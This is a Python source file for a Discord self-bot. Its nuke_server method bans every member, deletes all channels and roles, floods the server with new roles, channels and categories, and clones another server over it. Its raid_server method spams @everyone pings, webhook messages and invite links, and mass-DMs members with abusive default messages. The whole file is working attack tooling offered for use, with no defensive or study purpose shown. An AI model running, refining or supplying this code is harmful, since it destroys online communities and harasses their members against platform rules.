# actions.py
import asyncio
from discord import Guild
import discord 

class BotActions:
    def __init__(self, bot):
        self.bot = bot

    async def nuke_server(self, guild_id, create_roles=False, create_channels=False, create_categories=False, ban_all=False, delete_channels=False, delete_roles=False, clone_server=False, source_guild_id=None, role_count=10, channel_count=10, category_count=5):
        """
        Perform nuking actions on a Discord server.
        
        Parameters:
        - guild_id: The ID of the guild to nuke.
        - create_roles: If True, create roles.
        - create_channels: If True, create channels.
        - create_categories: If True, create categories.
        - ban_all: If True, ban all members.
        - delete_channels: If True, delete all channels.
        - delete_roles: If True, delete all roles (except @everyone).
        - clone_server: If True, clone another server.
        - source_guild_id: The ID of the source guild to clone (if clone_server=True).
        - role_count: Number of roles to create.
        - channel_count: Number of channels to create.
        - category_count: Number of categories to create.
        """
        guild = self.bot.bot.get_guild(guild_id)
        if not guild:
            print(f"Guild {guild_id} not found.")
            return

        try:
            # Create Roles
            if create_roles:
                for i in range(role_count):
                    try:
                        await guild.create_role(name=f"Nuked-Role-{i}")
                        print(f"Created role Nuked-Role-{i} in guild {guild_id}")
                        await asyncio.sleep(0.5)  # Rate limiting
                    except Exception as e:
                        print(f"Failed to create role: {e}")

            # Create Channels
            if create_channels:
                for i in range(channel_count):
                    try:
                        await guild.create_text_channel(f"nuked-channel-{i}")
                        print(f"Created channel nuked-channel-{i} in guild {guild_id}")
                        await asyncio.sleep(0.5)
                    except Exception as e:
                        print(f"Failed to create channel: {e}")

            # Create Categories
            if create_categories:
                for i in range(category_count):
                    try:
                        await guild.create_category(f"Nuked-Category-{i}")
                        print(f"Created category Nuked-Category-{i} in guild {guild_id}")
                        await asyncio.sleep(0.5)
                    except Exception as e:
                        print(f"Failed to create category: {e}")

            # Ban All Members
            if ban_all:
                for member in guild.members:
                    if member != guild.me:  # Don't ban the bot itself
                        try:
                            await member.ban(reason="Nuked by self-bot")
                            print(f"Banned member {member.name} in guild {guild_id}")
                            await asyncio.sleep(0.5)
                        except Exception as e:
                            print(f"Failed to ban member {member.name}: {e}")

            # Delete All Channels
            if delete_channels:
                for channel in guild.channels:
                    try:
                        await channel.delete()
                        print(f"Deleted channel {channel.name} in guild {guild_id}")
                        await asyncio.sleep(0.5)
                    except Exception as e:
                        print(f"Failed to delete channel {channel.name}: {e}")

            # Delete All Roles
            if delete_roles:
                for role in guild.roles:
                    if role.name != "@everyone":  # Skip the default role
                        try:
                            await role.delete()
                            print(f"Deleted role {role.name} in guild {guild_id}")
                            await asyncio.sleep(0.5)  # Rate limiting
                        except Exception as e:
                            print(f"Failed to delete role {role.name}: {e}")

            # Clone Server
            if clone_server:
                if not source_guild_id:
                    print("No source guild ID provided for cloning.")
                    return

                source_guild = self.bot.bot.get_guild(source_guild_id)
                if not source_guild:
                    print(f"Source guild {source_guild_id} not found.")
                    return

                print(f"Cloning server {source_guild_id} to {guild_id}...")

                # Step 1: Copy the server name
                try:
                    await guild.edit(name=source_guild.name)
                    print(f"Copied server name '{source_guild.name}' to guild {guild_id}")
                except Exception as e:
                    print(f"Failed to copy server name: {e}")

                # Step 2: Clear existing roles in the target guild (except @everyone)
                for role in guild.roles:
                    if role.name != "@everyone":
                        try:
                            await role.delete()
                            print(f"Deleted role {role.name} in guild {guild_id}")
                            await asyncio.sleep(0.5)
                        except Exception as e:
                            print(f"Failed to delete role {role.name}: {e}")

                # Step 3: Clear existing channels in the target guild
                for channel in guild.channels:
                    try:
                        await channel.delete()
                        print(f"Deleted channel {channel.name} in guild {guild_id}")
                        await asyncio.sleep(0.5)
                    except Exception as e:
                        print(f"Failed to delete channel {channel.name}: {e}")

                # Step 4: Copy roles from the source guild (excluding @everyone)
                for role in sorted(source_guild.roles, key=lambda r: r.position):
                    if role.name != "@everyone":
                        try:
                            new_role = await guild.create_role(
                                name=role.name,
                                color=role.color,
                                permissions=role.permissions,
                                hoist=role.hoist,
                                mentionable=role.mentionable
                            )
                            print(f"Copied role {role.name} to guild {guild_id}")
                            await asyncio.sleep(0.5)
                        except Exception as e:
                            print(f"Failed to copy role {role.name}: {e}")

                # Step 5: Copy categories and channels from the source guild
                # First, create categories
                category_mapping = {}  # Maps source category ID to new category in target guild
                for category in sorted(source_guild.categories, key=lambda c: c.position):
                    try:
                        new_category = await guild.create_category(
                            name=category.name,
                            position=category.position
                        )
                        category_mapping[category.id] = new_category
                        print(f"Copied category {category.name} to guild {guild_id}")
                        await asyncio.sleep(0.5)
                    except Exception as e:
                        print(f"Failed to copy category {category.name}: {e}")

                # Then, create channels within categories
                for channel in sorted(source_guild.channels, key=lambda c: c.position):
                    try:
                        if channel.category:  # Channel belongs to a category
                            new_category = category_mapping.get(channel.category.id)
                            if not new_category:
                                print(f"Category for channel {channel.name} not found, skipping...")
                                continue
                            if isinstance(channel, discord.TextChannel):
                                await guild.create_text_channel(
                                    name=channel.name,
                                    category=new_category,
                                    position=channel.position,
                                    topic=channel.topic if channel.topic else None
                                )
                                print(f"Copied text channel {channel.name} to guild {guild_id} under category {new_category.name}")
                            elif isinstance(channel, discord.VoiceChannel):
                                await guild.create_voice_channel(
                                    name=channel.name,
                                    category=new_category,
                                    position=channel.position,
                                    bitrate=channel.bitrate,
                                    user_limit=channel.user_limit
                                )
                                print(f"Copied voice channel {channel.name} to guild {guild_id} under category {new_category.name}")
                        else:  # Channel does not belong to a category
                            if isinstance(channel, discord.TextChannel):
                                await guild.create_text_channel(
                                    name=channel.name,
                                    position=channel.position,
                                    topic=channel.topic if channel.topic else None
                                )
                                print(f"Copied text channel {channel.name} to guild {guild_id}")
                            elif isinstance(channel, discord.VoiceChannel):
                                await guild.create_voice_channel(
                                    name=channel.name,
                                    position=channel.position,
                                    bitrate=channel.bitrate,
                                    user_limit=channel.user_limit
                                )
                                print(f"Copied voice channel {channel.name} to guild {guild_id}")
                        await asyncio.sleep(0.5)
                    except Exception as e:
                        print(f"Failed to copy channel {channel.name}: {e}")

                print(f"Completed cloning server {source_guild_id} to {guild_id}")

        except Exception as e:
            print(f"Error during nuke_server: {e}")
            raise

    async def raid_server(self, guild_id, role_spam=False, multi_spam=False, mass_dm=False, webhook_spam=False, invite_spam=False, spam_message="@everyone Get fucked, losers!", spam_count=10, spam_delay=0.5, dm_message="You’ve been raided, bitch!"):
        """
        Perform raiding actions on a Discord server.
        """
        guild = self.bot.bot.get_guild(guild_id)
        if not guild:
            print(f"Guild {guild_id} not found.")
            return

        try:
            # Role Spam Ping
            if role_spam:
                for channel in guild.text_channels:
                    try:
                        for _ in range(spam_count):
                            await channel.send(f"{spam_message} {guild.default_role.mention}")
                            print(f"Sent role spam message in {channel.name}")
                            await asyncio.sleep(spam_delay)
                    except Exception as e:
                        print(f"Failed to send role spam in {channel.name}: {e}")

            # Multi-Channel Spam
            if multi_spam:
                for channel in guild.text_channels:
                    try:
                        for _ in range(spam_count):
                            await channel.send(spam_message)
                            print(f"Sent spam message in {channel.name}")
                            await asyncio.sleep(spam_delay)
                    except Exception as e:
                        print(f"Failed to send spam in {channel.name}: {e}")

            # Mass DM Members
            if mass_dm:
                for member in guild.members:
                    if member != guild.me:
                        try:
                            await member.send(dm_message)
                            print(f"Sent DM to {member.name}")
                            await asyncio.sleep(spam_delay)
                        except Exception as e:
                            print(f"Failed to send DM to {member.name}: {e}")

            # Webhook Spam
            if webhook_spam:
                for channel in guild.text_channels:
                    try:
                        webhook = await channel.create_webhook(name="NukeWebhook")
                        for _ in range(spam_count):
                            await webhook.send(spam_message)
                            print(f"Sent webhook spam in {channel.name}")
                            await asyncio.sleep(spam_delay)
                        await webhook.delete()
                    except Exception as e:
                        print(f"Failed to send webhook spam in {channel.name}: {e}")

            # Invite Spam
            if invite_spam:
                for channel in guild.text_channels:
                    try:
                        invite = await channel.create_invite()
                        for _ in range(spam_count):
                            await channel.send(f"Join this server! {invite.url}")
                            print(f"Sent invite spam in {channel.name}")
                            await asyncio.sleep(spam_delay)
                    except Exception as e:
                        print(f"Failed to send invite spam in {channel.name}: {e}")

        except Exception as e:
            print(f"Error during raid_server: {e}")
            raise